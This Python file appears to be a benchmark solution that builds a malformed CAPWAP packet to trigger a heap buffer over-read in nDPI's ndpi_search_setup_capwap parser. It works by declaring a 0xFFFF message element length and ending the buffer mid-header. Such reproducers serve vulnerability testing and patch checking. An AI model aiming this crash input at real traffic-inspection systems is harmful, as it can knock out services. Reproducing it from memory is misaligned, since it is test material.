import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        The vulnerability is a buffer overread caused by trusting the Message Element Length 
        field in the CAPWAP Control Header without sufficient bounds checking.
        """
        # CAPWAP Header (8 bytes)
        # Byte 0: Preamble (0x00)
        # Byte 1: HLEN = 2 (0x10 -> 00010 000, 5 bits HLEN)
        # Byte 2: T = 1 (Control Message) (0x01 -> LSB is T bit)
        # Bytes 3-7: Padding
        header = b'\x00\x10\x01\x00\x00\x00\x00\x00'
        
        # CAPWAP Control Header (8 bytes)
        # Msg Type: 1 (Discovery Request) -> 0x00000001
        # Seq Num: 0
        # Msg Element Length: 0xFFFF (Maximum length to bypass bounds check loop)
        # Flags: 0
        control_header = b'\x00\x00\x00\x01\x00\xFF\xFF\x00'
        
        # Malformed Payload construction
        # We target a packet length of 33 bytes.
        # Current length = 16 bytes.
        # We add a valid TLV to advance the parser offset to 32 (Packet Length - 1).
        # TLV Header: 4 bytes. Value: 12 bytes. Total 16 bytes.
        # Offset becomes 16 + 16 = 32.
        tlv_type = b'\x00\x01'
        tlv_len = b'\x00\x0C' # 12 bytes
        tlv_value = b'\x00' * 12
        valid_tlv = tlv_type + tlv_len + tlv_value
        
        # Trailing byte at offset 32.
        # The loop expects more data (due to Msg Element Length = 0xFFFF).
        # It attempts to read the next TLV Header (Type) at offset 32.
        # Reading a 2-byte Type from offset 32 (where buffer ends at 33) causes a read of byte 33 (OOB).
        trailing = b'\x00'
        
        return header + control_header + valid_tlv + trailing